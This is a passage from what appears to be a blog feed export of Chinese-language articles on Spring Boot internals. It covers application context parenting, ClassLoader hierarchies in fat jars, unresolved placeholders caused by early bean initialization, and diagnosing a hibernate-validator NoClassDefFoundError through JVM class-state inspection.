Context时，就会保存到ManagementContextResolver里。 123456789101112131415161718192021222324252627@Configuration@ConditionalOnClass(&#123; Servlet.class, DispatcherServlet.class &#125;)@ConditionalOnWebApplication@AutoConfigureAfter(&#123; PropertyPlaceholderAutoConfiguration.class, EmbeddedServletContainerAutoConfiguration.class, WebMvcAutoConfiguration.class, ManagementServerPropertiesAutoConfiguration.class, RepositoryRestMvcAutoConfiguration.class, HypermediaAutoConfiguration.class, HttpMessageConvertersAutoConfiguration.class &#125;)public class EndpointWebMvcAutoConfiguration implements ApplicationContextAware, BeanFactoryAware, SmartInitializingSingleton &#123; @Bean public ManagementContextResolver managementContextResolver() &#123; return new ManagementContextResolver(this.applicationContext); &#125; @Bean public ManagementServletContext managementServletContext( final ManagementServerProperties properties) &#123; return new ManagementServletContext() &#123; @Override public String getContextPath() &#123; return properties.getContextPath(); &#125; &#125;; &#125; 如何在Endpoints代码里获取应用的Spring contextspring boot本身没有提供方法，应用可以自己写一个@Configuration，保存应用的Spring context，然后在endpoints代码里再取出来。 ApplicationContext.setParent(ApplicationContext) 到底发生了什么从spring的代码就可以看出来，主要是把parent的environment里的propertySources加到child里。这也就是spring cloud config可以生效的原因。 12345678910111213141516171819// org.springframework.context.support.AbstractApplicationContext.setParent(ApplicationContext)/** * Set the parent of this application context. * &lt;p&gt;The parent &#123;@linkplain ApplicationContext#getEnvironment() environment&#125; is * &#123;@linkplain ConfigurableEnvironment#merge(ConfigurableEnvironment) merged&#125; with * this (child) application context environment if the parent is non-&#123;@code null&#125; and * its environment is an instance of &#123;@link ConfigurableEnvironment&#125;. * @see ConfigurableEnvironment#merge(ConfigurableEnvironment) */@Overridepublic void setParent(ApplicationContext parent) &#123; this.parent = parent; if (parent != null) &#123; Environment parentEnvironment = parent.getEnvironment(); if (parentEnvironment instanceof ConfigurableEnvironment) &#123; getEnvironment().merge((ConfigurableEnvironment) parentEnvironment); &#125; &#125;&#125; 123456789101112131415161718192021222324252627// org.springframework.core.env.AbstractEnvironment.merge(ConfigurableEnvironment)@Overridepublic void merge(ConfigurableEnvironment parent) &#123; for (PropertySource&lt;?&gt; ps : parent.getPropertySources()) &#123; if (!this.propertySources.contains(ps.getName())) &#123; this.propertySources.addLast(ps); &#125; &#125; String[] parentActiveProfiles = parent.getActiveProfiles(); if (!ObjectUtils.isEmpty(parentActiveProfiles)) &#123; synchronized (this.activeProfiles) &#123; for (String profile : parentActiveProfiles) &#123; this.activeProfiles.add(profile); &#125; &#125; &#125; String[] parentDefaultProfiles = parent.getDefaultProfiles(); if (!ObjectUtils.isEmpty(parentDefaultProfiles)) &#123; synchronized (this.defaultProfiles) &#123; this.defaultProfiles.remove(RESERVED_DEFAULT_PROFILE_NAME); for (String profile : parentDefaultProfiles) &#123; this.defaultProfiles.add(profile); &#125; &#125; &#125;&#125; 总结 当配置management.port 为独立端口时，Management Spring Context也会是独立的context，它的parent是应用的spring context 当启动spring cloud时，spring cloud自己会创建出一个spring context，并置为应用的context的parent ApplicationContext.setParent(ApplicationContext) 主要是把parent的environment里的propertySources加到child里 理解的spring boot context的继承关系，能避免一些微妙的spring bean注入的问题，还有不当的spring context的问题]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring</tag>
        <tag>spring-boot</tag>
        <tag>context</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入Spring Boot：ClassLoader的继承关系和影响]]></title>
    <url>%2Fspring-boot-classloader%2F</url>
    <content type="text"><![CDATA[前言对spring boot本身启动原理的分析，请参考：http://hengyunabc.github.io/spring-boot-application-start-analysis/ Spring boot里的ClassLoader继承关系可以运行下面提供的demo，分别在不同的场景下运行，可以知道不同场景下的Spring boot应用的ClassLoader继承关系。 https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-classloader-context 分三种情况： 在IDE里，直接run main函数则Spring的ClassLoader直接是SystemClassLoader。ClassLoader的urls包含全部的jar和自己的target/classes 123456========= Spring Boot Application ClassLoader Urls =============ClassLoader urls: sun.misc.Launcher$AppClassLoader@2a139a55file:/Users/hengyunabc/code/java/spring-boot-inside/demo-classloader-context/target/classes/file:/Users/hengyunabc/.m2/repository/org/springframework/cloud/spring-cloud-starter/1.1.9.RELEASE/spring-cloud-starter-1.1.9.RELEASE.jarfile:/Users/hengyunabc/.m2/repository/org/springframework/boot/spring-boot-starter/1.4.7.RELEASE/spring-boot-starter-1.4.7.RELEASE.jar... 以fat jar运行12mvn clean packagejava -jar target/demo-classloader-context-0.0.1-SNAPSHOT.jar 执行应用的main函数的ClassLoader是LaunchedURLClassLoader，它的parent是SystemClassLoader。 1234========= ClassLoader Tree=============org.springframework.boot.loader.LaunchedURLClassLoader@1218025c- sun.misc.Launcher$AppClassLoader@6bc7c054-- sun.misc.Launcher$ExtClassLoader@85ede7b 并且LaunchedURLClassLoader的urls是 fat jar里的BOOT-INF/classes!/目录和BOOT-INF/lib里的所有jar。 123456========= Spring Boot Application ClassLoader Urls =============ClassLoader urls: org.springframework.boot.loader.LaunchedURLClassLoader@1218025cjar:file:/Users/hengyunabc/code/java/spring-boot-inside/demo-classloader-context/target/demo-classloader-context-0.0.1-SNAPSHOT.jar!/BOOT-INF/classes!/jar:file:/Users/hengyunabc/code/java/spring-boot-inside/demo-classloader-context/target/demo-classloader-context-0.0.1-SNAPSHOT.jar!/BOOT-INF/lib/spring-boot-1.4.7.RELEASE.jar!/jar:file:/Users/hengyunabc/code/java/spring-boot-inside/demo-classloader-context/target/demo-classloader-context-0.0.1-SNAPSHOT.jar!/BOOT-INF/lib/spring-web-4.3.9.RELEASE.jar!/... SystemClassLoader的urls是demo-classloader-context-0.0.1-SNAPSHOT.jar本身。 123========= System ClassLoader Urls =============ClassLoader urls: sun.misc.Launcher$AppClassLoader@6bc7c054file:/Users/hengyunabc/code/java/spring-boot-inside/demo-classloader-context/target/demo-classloader-context-0.0.1-SNAPSHOT.jar 以解压目录运行12345mvn clean packagecd targetunzip demo-classloader-context-0.0.1-SNAPSHOT.jar -d democd demojava org.springframework.boot.loader.PropertiesLauncher 执行应用的main函数的ClassLoader是LaunchedURLClassLoader，它的parent是SystemClassLoader。 1234========= ClassLoader Tree=============org.springframework.boot.loader.LaunchedURLClassLoader@4aa298b7- sun.misc.Launcher$AppClassLoader@2a139a55-- sun.misc.Launcher$ExtClassLoader@1b6d3586 LaunchedURLClassLoader的urls是解压目录里的BOOT-INF/classes/和/BOOT-INF/lib/下面的jar包。 123456========= Spring Boot Application ClassLoader Urls =============ClassLoader urls: org.springframework.boot.loader.LaunchedURLClassLoader@4aa298b7file:/Users/hengyunabc/code/java/spring-boot-inside/demo-classloader-context/target/demo/BOOT-INF/classes/jar:file:/Users/hengyunabc/code/java/spring-boot-inside/demo-classloader-context/target/demo/BOOT-INF/lib/bcpkix-jdk15on-1.55.jar!/jar:file:/Users/hengyunabc/code/java/spring-boot-inside/demo-classloader-context/target/demo/BOOT-INF/lib/bcprov-jdk15on-1.55.jar!/jar:file:/Users/hengyunabc/code/java/spring-boot-inside/demo-classloader-context/target/demo/BOOT-INF/lib/classmate-1.3.3.jar!/ SystemClassLoader的urls只有当前目录： 123========= System ClassLoader Urls =============ClassLoader urls: sun.misc.Launcher$AppClassLoader@2a139a55file:/Users/hengyunabc/code/java/spring-boot-inside/demo-classloader-context/target/demo/ 其实还有两种运行方式：mvn spring-boot:run 和 mvn spring-boot:run -Dfork=true，但是比较少使用，不单独讨论。感觉兴趣的话可以自行跑下。 总结spring boot里ClassLoader的继承关系 在IDE里main函数执行时，只有一个ClassLoader，也就是SystemClassLoader 在以fat jar运行时，有一个LaunchedURLClassLoader，它的parent是SystemClassLoader LaunchedURLClassLoader的urls是fat jar里的BOOT-INF/classes和BOOT-INF/lib下的jar。SystemClassLoader的urls是fat jar本身。 在解压目录（exploded directory）运行时，和fat jar类似，不过url都是目录形式。目录形式会有更好的兼容性。 spring boot 1.3. 和 1.4. 版本的区别在spring boot 1.3.* 版本里 应用的类和spring boot loader的类都是打包在一个fat jar里 应用依赖的jar放在fat jar里的/lib下面。 在spring boot 1.4.* 版本后 spring boot loader的类放在fat jar里 应用的类打包放在fat jar的BOOT-INF/classes目录里 应用依赖的jar放在fat jar里的/lib下面。 spring boot 1.4的打包结构改动是这个commit引入的https://github.com/spring-projects/spring-boot/commit/87fe0b2adeef85c842c009bfeebac1c84af8a5d7 这个commit的本意是简化classloader的继承关系，以一种直观的parent优先的方式来实现LaunchedURLClassLoader，同时打包结构和传统的war包应用更接近。 但是这个改动引起了很多复杂的问题，从上面我们分析的ClassLoader继承关系就有点头晕了。 目前的ClassLoader继承关系带来的一些影响有很多用户可能会发现，一些代码在IDE里跑得很好，但是在实际部署运行时不工作。很多时候就是ClassLoader的结构引起的，下面分析一些案例。 demo.jar!/BOOT-INF/classes!/ 这样子url不工作因为spring boot是扩展了标准的jar协议，让它支持多层的jar in jar，还有directory in jar。参考spring boot应用启动原理分析 在spring boot 1.3的时候尽管会有jar in jar，但是一些比较健壮的代码可以处理这种情况，比如tomcat8自己就支持jar in jar。 但是绝大部分代码都不会支持像demo.jar!/BOOT-INF/classes!/ 这样子directory in jar的多重url，所以在spring boot1.4里，很多库的代码都会失效。 demo.jar!/META-INF/resources 下的资源问题在servlet 3.0规范里，应用可以把静态资源放在META-INF/resources下面，servlet container会支持读取。但是从上面的继承结果，我们可以发现一个问题： 应用以fat jar来启动，启动embedded tomcat的ClassLoader是LaunchedURLClassLoader LaunchedURLClassLoader的urls并没有fat jar本身 应用的main函数所在的模块的src/main/resources/META-INF/resources目录被打包到了fat jar里，也就是demo.jar!/META-INF/resources 应用的fat jar是SystemClassLoader的url，也就是LaunchedURLClassLoader的parent 这样子就造成了一些奇怪的现象： 应用直接用自己的ClassLoader.getResources()是可以获取到META-INF/resources的资源的 但是embedded tomcat并没有把fat jar本身加入到它的 ResourcesSet 里，因为它在启动时ClassLoader是LaunchedURLClassLoader，它只扫描自己的ClassLoader的urls 应用把资源放在其它的jar包的META-INF/resources下可以访问到，把资源放在自己的main函数的src/main/resources/META-INF/resources下时，访问不到了 另外，spring boot的官方jsp的例子只支持war的打包格式，不支持fat jar，也是由这个引起的。 getResource(&quot;&quot;) 和 getResources(&quot;&quot;) 的返回值的问题getResource(&quot;&quot;)的语义是返回ClassLoader的urls的第一个url，很多时候使用者以为这个就是它们自己的classes的目录，或者是jar的url。 但是实际上，因为ClassLoader加载urls列表时，有随机性，和OS低层实现有关，并不能保证urls的顺序都是一样的。所以getResource(&quot;&quot;)很多时候返回的结果并不一样。 但是很多库，或者应用依赖这个代码来定位扫描资源，这样子在spring boot下就不工作了。 另外，值得注意的是spring boot在三种不同形式下运行，getResources(&quot;&quot;)返回的结果也不一样。用户可以自己改下demo里的代码，打印下结果。 简而言之，不要依赖这两个API，最好自己放一个资源来定位。或者直接利用spring自身提供的资源扫描机制。 类似 classpath*:**-service.xml 的通配问题用户有多个代码模块，在不同模块下都放了多个*-service.xml的spring配置文件。 用户如果使用类似classpath*:**-service.xml的通配符来加载资源的话，很有可能出现在IDE里跑时，可以正确加载，但是在fat jar下，却加载不到的问题。 从spring自己的文档可以看到相关的解析： https://docs.spring.io/spring/docs/4.3.9.RELEASE/javadoc-api/org/springframework/core/io/support/PathMatchingResourcePatternResolver.html WARNING: Note that “classpath:” when combined with Ant-style patterns will only work reliably with at least one root directory before the pattern starts, unless the actual target files reside in the file system. This means that a pattern like “classpath:*.xml” will not retrieve files from the root of jar files but rather only from the root of expanded directories. This originates from a limitation in the JDK’s ClassLoader.getResources() method which only returns file system locations for a passed-in empty String (indicating potential roots to search). This ResourcePatternResolver implementation is trying to mitigate the jar root lookup limitation through URLClassLoader introspection and “java.class.path” manifest evaluation; however, without portability guarantees. 就是说使用 classpath*来匹配其它的jar包时，需要有一层目录在前面，不然的话是匹配不到的，这个是ClassLoader.getResources() 函数导致的。 因为在IDE里跑时，应用所依赖的其它模块通常就是一个classes目录，所以通常没有问题。 但是当以fat jar来跑时，其它的模块都被打包为一个jar，放在BOOT-INF/lib下面，所以这时通配就会失败。 总结 这个新的BOOT-INF打包格式有它的明显好处：更清晰，更接近war包的格式。 spring boot的ClassLoader的结构修改带来的复杂问题，并非当初修改的人所能预见的 很多问题需要理解spring boot的ClassLoader结构，否则不能找到根本原因]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring</tag>
        <tag>ClassLoader</tag>
        <tag>spring-boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入Spring Boot：那些注入不了的Spring占位符（${}表达式）]]></title>
    <url>%2Fspring-placeholder-inject-failed-cases%2F</url>
    <content type="text"><![CDATA[Spring里的占位符spring里的占位符通常表现的形式是： 123&lt;bean id="dataSource" destroy-method="close" class="org.apache.commons.dbcp.BasicDataSource"&gt; &lt;property name="url" value="$&#123;jdbc.url&#125;"/&gt;&lt;/bean&gt; 或者 123456@Configuration@ImportResource("classpath:/com/acme/properties-config.xml")public class AppConfig &#123; @Value("$&#123;jdbc.url&#125;") private String url;&#125; Spring应用在有时会出现占位符配置没有注入，原因可能是多样的。 本文介绍两种比较复杂的情况。 占位符是在Spring生命周期的什么时候处理的Spirng在生命周期里关于Bean的处理大概可以分为下面几步： 加载Bean定义（从xml或者从@Import等） 处理BeanFactoryPostProcessor 实例化Bean 处理Bean的property注入 处理BeanPostProcessor 当然这只是比较理想的状态，实际上因为Spring Context在构造时，也需要创建很多内部的Bean，应用在接口实现里也会做自己的各种逻辑，整个流程会非常复杂。 那么占位符（${}表达式）是在什么时候被处理的？ 实际上是在org.springframework.context.support.PropertySourcesPlaceholderConfigurer里处理的，它会访问了每一个bean的BeanDefinition，然后做占位符的处理 PropertySourcesPlaceholderConfigurer实现了BeanFactoryPostProcessor接口 PropertySourcesPlaceholderConfigurer的 order是Ordered.LOWEST_PRECEDENCE，也就是最低优先级的 结合上面的Spring的生命周期，如果Bean的创建和使用在PropertySourcesPlaceholderConfigurer之前，那么就有可能出现占位符没有被处理的情况。 例子1：Mybatis 的 MapperScannerConfigurer引起的占位符没有处理例子代码：https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-mybatis-placeholder 首先应用自己在代码里创建了一个DataSource，其中${db.user}是希望从application.properties里注入的。代码在运行时会打印出user的实际值。 1234567891011@Configurationpublic class MyDataSourceConfig &#123; @Bean(name = "dataSource1") public DataSource dataSource1(@Value("$&#123;db.user&#125;") String user) &#123; System.err.println("user: " + user); JdbcDataSource ds = new JdbcDataSource(); ds.setURL("jdbc:h2:˜/test"); ds.setUser(user); return ds; &#125;&#125; 然后应用用代码的方式来初始化mybatis相关的配置，依赖上面创建的DataSource对象 12345678910111213141516171819202122@Configurationpublic class MybatisConfig1 &#123; @Bean(name = "sqlSessionFactory1") public SqlSessionFactory sqlSessionFactory1(DataSource dataSource1) throws Exception &#123; SqlSessionFactoryBean sqlSessionFactoryBean = new SqlSessionFactoryBean(); org.apache.ibatis.session.Configuration ibatisConfiguration = new org.apache.ibatis.session.Configuration(); sqlSessionFactoryBean.setConfiguration(ibatisConfiguration); sqlSessionFactoryBean.setDataSource(dataSource1); sqlSessionFactoryBean.setTypeAliasesPackage("sample.mybatis.domain"); return sqlSessionFactoryBean.getObject(); &#125; @Bean MapperScannerConfigurer mapperScannerConfigurer(SqlSessionFactory sqlSessionFactory1) &#123; MapperScannerConfigurer mapperScannerConfigurer = new MapperScannerConfigurer(); mapperScannerConfigurer.setSqlSessionFactoryBeanName("sqlSessionFactory1"); mapperScannerConfigurer.setBasePackage("sample.mybatis.mapper"); return mapperScannerConfigurer; &#125;&#125; 当代码运行时，输出结果是： 1user: $&#123;db.user&#125; 为什么会user这个变量没有被注入？ 分析下Bean定义，可以发现MapperScannerConfigurer它实现了BeanDefinitionRegistryPostProcessor。这个接口在是Spring扫描Bean定义时会回调的，远早于BeanFactoryPostProcessor。 所以原因是： MapperScannerConfigurer它实现了BeanDefinitionRegistryPostProcessor，所以它会Spring的早期会被创建 从bean的依赖关系来看，mapperScannerConfigurer依赖了sqlSessionFactory1，sqlSessionFactory1依赖了dataSource1 MyDataSourceConfig里的dataSource1被提前初始化，没有经过PropertySourcesPlaceholderConfigurer的处理，所以@Value(&quot;${db.user}&quot;) String user 里的占位符没有被处理 要解决这个问题，可以在代码里，显式来处理占位符： 1environment.resolvePlaceholders("$&#123;db.user&#125;") 例子2：Spring boot自身实现问题，导致Bean被提前初始化例子代码：https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-ConditionalOnBean-placeholder Spring Boot里提供了@ConditionalOnBean，这个方便用户在不同条件下来创建bean。里面提供了判断是否存在bean上有某个注解的功能。 123456789101112@Target(&#123; ElementType.TYPE, ElementType.METHOD &#125;)@Retention(RetentionPolicy.RUNTIME)@Documented@Conditional(OnBeanCondition.class)public @interface ConditionalOnBean &#123; /** * The annotation type decorating a bean that should be checked. The condition matches * when any of the annotations specified is defined on a bean in the * &#123;@link ApplicationContext&#125;. * @return the class-level annotation types to check */ Class&lt;? extends Annotation&gt;[] annotation() default &#123;&#125;; 比如用户自己定义了一个Annotation： 1234@Target(&#123; ElementType.TYPE &#125;)@Retention(RetentionPolicy.RUNTIME)public @interface MyAnnotation &#123;&#125; 然后用下面的写法来创建abc这个bean，意思是当用户显式使用了@MyAnnotation（比如放在main class上），才会创建这个bean。 123456789@Configurationpublic class MyAutoConfiguration &#123; @Bean // if comment this line, it will be fine. @ConditionalOnBean(annotation = &#123; MyAnnotation.class &#125;) public String abc() &#123; return "abc"; &#125;&#125; 这个功能很好，但是在spring boot 1.4.5 版本之前都有问题，会导致FactoryBean提前初始化。 在例子里，通过xml创建了javaVersion这个bean，想获取到java的版本号。这里使用的是spring提供的一个调用static函数创建bean的技巧。 12345678910&lt;bean id="sysProps" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean"&gt; &lt;property name="targetClass" value="java.lang.System" /&gt; &lt;property name="targetMethod" value="getProperties" /&gt;&lt;/bean&gt;&lt;bean id="javaVersion" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean"&gt; &lt;property name="targetObject" ref="sysProps" /&gt; &lt;property name="targetMethod" value="getProperty" /&gt; &lt;property name="arguments" value="$&#123;java.version.key&#125;" /&gt;&lt;/bean&gt; 我们在代码里获取到这个javaVersion，然后打印出来： 123456789@SpringBootApplication@ImportResource("classpath:/demo.xml")public class DemoApplication &#123; public static void main(String[] args) &#123; ConfigurableApplicationContext context = SpringApplication.run(DemoApplication.class, args); System.err.println(context.getBean("javaVersion")); &#125;&#125; 在实际运行时，发现javaVersion的值是null。 这个其实是spring boot的锅，要搞清楚这个问题，先要看@ConditionalOnBean的实现。 @ConditionalOnBean实际上是在ConfigurationClassPostProcessor里被处理的，它实现了BeanDefinitionRegistryPostProcessor BeanDefinitionRegistryPostProcessor是在spring早期被处理的 @ConditionalOnBean的具体处理代码在org.springframework.boot.autoconfigure.condition.OnBeanCondition里 OnBeanCondition在获取bean的Annotation时，调用了beanFactory.getBeanNamesForAnnotation 123456789private String[] getBeanNamesForAnnotation( ConfigurableListableBeanFactory beanFactory, String type, ClassLoader classLoader, boolean considerHierarchy) throws LinkageError &#123; String[] result = NO_BEANS; try &#123; @SuppressWarnings("unchecked") Class&lt;? extends Annotation&gt; typeClass = (Class&lt;? extends Annotation&gt;) ClassUtils .forName(type, classLoader); result = beanFactory.getBeanNamesForAnnotation(typeClass); beanFactory.getBeanNamesForAnnotation 会导致FactoryBean提前初始化，创建出javaVersion里，传入的${java.version.key}没有被处理，值为null。 spring boot 1.4.5 修复了这个问题：https://github.com/spring-projects/spring-boot/issues/8269 实现spring boot starter要注意不能导致bean提前初始化用户在实现spring boot starter时，通常会实现Spring的一些接口，比如BeanFactoryPostProcessor接口，在处理时，要注意不能调用类似beanFactory.getBeansOfType，beanFactory.getBeanNamesForAnnotation 这些函数，因为会导致一些bean提前初始化。 而上面有提到PropertySourcesPlaceholderConfigurer的order是最低优先级的，所以用户自己实现的BeanFactoryPostProcessor接口在被回调时很有可能占位符还没有被处理。 对于用户自己定义的@ConfigurationProperties对象的注入，可以用类似下面的代码： 1234@ConfigurationProperties(prefix = "spring.my")public class MyProperties &#123; String key;&#125; 12345678910public static MyProperties buildMyProperties(ConfigurableEnvironment environment) &#123; MyProperties myProperties = new MyProperties(); if (environment != null) &#123; MutablePropertySources propertySources = environment.getPropertySources(); new RelaxedDataBinder(myProperties, "spring.my").bind(new PropertySourcesPropertyValues(propertySources)); &#125; return myProperties;&#125; 总结 占位符（${}表达式）是在PropertySourcesPlaceholderConfigurer里处理的，也就是BeanFactoryPostProcessor接口 spring的生命周期是比较复杂的事情，在实现了一些早期的接口时要小心，不能导致spring bean提前初始化 在早期的接口实现里，如果想要处理占位符，可以利用spring自身的api，比如 environment.resolvePlaceholders(&quot;${db.user}&quot;)]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring</tag>
        <tag>spring-boot</tag>
        <tag>springmvc</tag>
        <tag>mvc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入JVM分析spring-boot应用hibernate-validator NoClassDefFoundError]]></title>
    <url>%2Fhibernate-validar-noclassdefounderror%2F</url>
    <content type="text"><![CDATA[问题 可重现的Demo代码：https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-hibernate-validator-NoClassDefFoundError 最近排查一个spring boot应用抛出hibernate.validator NoClassDefFoundError的问题，异常信息如下： 1234567891011Caused by: java.lang.NoClassDefFoundError: Could not initialize class org.hibernate.validator.internal.engine.ConfigurationImpl at org.hibernate.validator.HibernateValidator.createGenericConfiguration(HibernateValidator.java:33) ~[hibernate-validator-5.3.5.Final.jar:5.3.5.Final] at javax.validation.Validation$GenericBootstrapImpl.configure(Validation.java:276) ~[validation-api-1.1.0.Final.jar:na] at org.springframework.boot.validation.MessageInterpolatorFactory.getObject(MessageInterpolatorFactory.java:53) ~[spring-boot-1.5.3.RELEASE.jar:1.5.3.RELEASE] at org.springframework.boot.autoconfigure.validation.DefaultValidatorConfiguration.defaultValidator(DefaultValidatorConfiguration.java:43) ~[spring-boot-autoconfigure-1.5.3.RELEASE.jar:1.5.3.RELEASE] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_112] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_112] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_112] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_112] at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:162) ~[spring-beans-4.3.8.RELEASE.jar:4.3.8.RELEASE] ... 32 common frames omitted 这个错误信息表面上是NoClassDefFoundError，但是实际上ConfigurationImpl这个类是在hibernate-validator-5.3.5.Final.jar里的，不应该出现找不到类的情况。 那为什么应用里抛出这个NoClassDefFoundError ？ 有经验的开发人员从Could not initialize class 这个信息就可以知道，实际上是一个类在初始化时抛出的异常，比如static的静态代码块，或者static字段初始化的异常。 谁初始化了 org.hibernate.validator.internal.engine.ConfigurationImpl但是当我们在HibernateValidator 这个类，创建ConfigurationImpl的代码块里打断点时，发现有两个线程触发了断点： 12345public class HibernateValidator implements ValidationProvider&lt;HibernateValidatorConfiguration&gt; &#123; @Override public Configuration&lt;?&gt; createGenericConfiguration(BootstrapState state) &#123; return new ConfigurationImpl( state ); &#125; 其中一个线程的调用栈是： 1234567Thread [background-preinit] (Class load: ConfigurationImpl) HibernateValidator.createGenericConfiguration(BootstrapState) line: 33 Validation$GenericBootstrapImpl.configure() line: 276 BackgroundPreinitializer$ValidationInitializer.run() line: 107 BackgroundPreinitializer$1.runSafely(Runnable) line: 59 BackgroundPreinitializer$1.run() line: 52 Thread.run() line: 745 另外一个线程调用栈是： 1234567891011121314Thread [main] (Suspended (breakpoint at line 33 in HibernateValidator)) owns: ConcurrentHashMap&lt;K,V&gt; (id=52) owns: Object (id=53) HibernateValidator.createGenericConfiguration(BootstrapState) line: 33 Validation$GenericBootstrapImpl.configure() line: 276 MessageInterpolatorFactory.getObject() line: 53 DefaultValidatorConfiguration.defaultValidator() line: 43 NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) line: not available [native method] NativeMethodAccessorImpl.invoke(Object, Object[]) line: 62 DelegatingMethodAccessorImpl.invoke(Object, Object[]) line: 43 Method.invoke(Object, Object...) line: 498 CglibSubclassingInstantiationStrategy(SimpleInstantiationStrategy).instantiate(RootBeanDefinition, String, BeanFactory, Object, Method, Object...) line: 162 ConstructorResolver.instantiateUsingFactoryMethod(String, RootBeanDefinition, Object[]) line: 588 DefaultListableBeanFactory(AbstractAutowireCapableBeanFactory).instantiateUsingFactoryMethod(String, RootBeanDefinition, Object[]) line: 1173 显然，这个线程的调用栈是常见的spring的初始化过程。 BackgroundPreinitializer 做了什么那么重点来看下 BackgroundPreinitializer 线程做了哪些事情： 123456789101112131415161718192021222324252627282930@Order(LoggingApplicationListener.DEFAULT_ORDER + 1)public class BackgroundPreinitializer implements ApplicationListener&lt;ApplicationEnvironmentPreparedEvent&gt; &#123; @Override public void onApplicationEvent(ApplicationEnvironmentPreparedEvent event) &#123; try &#123; Thread thread = new Thread(new Runnable() &#123; @Override public void run() &#123; runSafely(new MessageConverterInitializer()); runSafely(new MBeanFactoryInitializer()); runSafely(new ValidationInitializer()); runSafely(new JacksonInitializer()); runSafely(new ConversionServiceInitializer()); &#125; public void runSafely(Runnable runnable) &#123; try &#123; runnable.run(); &#125; catch (Throwable ex) &#123; // Ignore &#125; &#125; &#125;, "background-preinit"); thread.start(); &#125; 可以看到BackgroundPreinitializer类是spring boot为了加速应用的初始化，以一个独立的线程来加载hibernate validator这些组件。 这个 background-preinit 线程会吞掉所有的异常。 显然ConfigurationImpl 初始化的异常也被吞掉了，那么如何才能获取到最原始的信息？ 获取到最原始的异常信息在BackgroundPreinitializer的 run() 函数里打一个断点（注意是Suspend thread类型, 不是Suspend VM），让它先不要触发ConfigurationImpl的加载，让spring boot的正常流程去触发ConfigurationImpl的加载，就可以知道具体的信息了。 那么打出来的异常信息是： 1234567Caused by: java.lang.NoSuchMethodError: org.jboss.logging.Logger.getMessageLogger(Ljava/lang/Class;Ljava/lang/String;)Ljava/lang/Object; at org.hibernate.validator.internal.util.logging.LoggerFactory.make(LoggerFactory.java:19) ~[hibernate-validator-5.3.5.Final.jar:5.3.5.Final] at org.hibernate.validator.internal.util.Version.&lt;clinit&gt;(Version.java:22) ~[hibernate-validator-5.3.5.Final.jar:5.3.5.Final] at org.hibernate.validator.internal.engine.ConfigurationImpl.&lt;clinit&gt;(ConfigurationImpl.java:71) ~[hibernate-validator-5.3.5.Final.jar:5.3.5.Final] at org.hibernate.validator.HibernateValidator.createGenericConfiguration(HibernateValidator.java:33) ~[hibernate-validator-5.3.5.Final.jar:5.3.5.Final] at javax.validation.Validation$GenericBootstrapImpl.configure(Validation.java:276) ~[validation-api-1.1.0.Final.jar:na] at org.springframework.boot.validation.MessageInterpolatorFactory.getObject(MessageInterpolatorFactory.java:53) ~[spring-boot-1.5.3.RELEASE.jar:1.5.3.RELEASE] 那么可以看出是 org.jboss.logging.Logger 这个类不兼容，少了getMessageLogger(Ljava/lang/Class;Ljava/lang/String;)Ljava/lang/Object 这个函数。 那么检查下应用的依赖，可以发现org.jboss.logging.Logger 在jboss-common-1.2.1.GA.jar和jboss-logging-3.3.1.Final.jar里都有。 显然是jboss-common-1.2.1.GA.jar 这个依赖过时了，需要排除掉。 总结异常的发生流程 应用依赖了jboss-common-1.2.1.GA.jar，它里面的org.jboss.logging.Logger太老 spring boot启动时，BackgroundPreinitializer里的线程去尝试加载ConfigurationImpl，然后触发了org.jboss.logging.Logger的函数执行问题 BackgroundPreinitializer 吃掉了异常信息，jvm把ConfigurationImpl标记为不可用的 spring boot正常的流程去加载ConfigurationImpl，jvm发现ConfigurationImpl类是不可用，直接抛出NoClassDefFoundError 12Caused by: java.lang.NoClassDefFoundError: Could not initialize class org.hibernate.validator.internal.engine.ConfigurationImpl` 深入JVM为什么第二次尝试加载ConfigurationImpl时，会直接抛出java.lang.NoClassDefFoundError: Could not initialize class ？ 下面用一段简单的代码来重现这个问题： 123456789101112try &#123; org.hibernate.validator.internal.util.Version.touch();&#125; catch (Throwable e) &#123; e.printStackTrace();&#125;System.in.read();try &#123; org.hibernate.validator.internal.util.Version.touch();&#125; catch (Throwable e) &#123; e.printStackTrace();&#125; 使用HSDB来确定类的状态当抛出第一个异常时，尝试用HSDB来看下这个类的状态。 1sudo java -classpath &quot;$JAVA_HOME/lib/sa-jdi.jar&quot; sun.jvm.hotspot.HSDB 然后在HSDB console里查找到Version的地址信息 12hsdb&gt; class org.hibernate.validator.internal.util.Versionorg/hibernate/validator/internal/util/Version @0x00000007c0060218 然后在Inspector查找到这个地址，发现_init_state是5。 再看下hotspot代码，可以发现5对应的定义是initialization_error： 1234567891011// /hotspot/src/share/vm/oops/instanceKlass.hpp// See "The Java Virtual Machine Specification" section 2.16.2-5 for a detailed description// of the class loading &amp; initialization procedure, and the use of the states.enum ClassState &#123; allocated, // allocated (but not yet linked) loaded, // loaded and inserted in class hierarchy (but not linked yet) linked, // successfully linked/verified (but not initialized yet) being_initialized, // currently running class initializer fully_initialized, // initialized (successfull final state) initialization_error // error happened during initialization&#125;; JVM规范里关于Initialization的内容http://docs.oracle.com/javase/specs/jvms/se7/html/jvms-5.html#jvms-5.5 从规范里可以看到初始一个类/接口有12步，比较重要的两步都用黑体标记出来了： 5: If the Class object for C is in an erroneous state, then initialization is not possible. Release LC and throw a NoClassDefFoundError. 11: 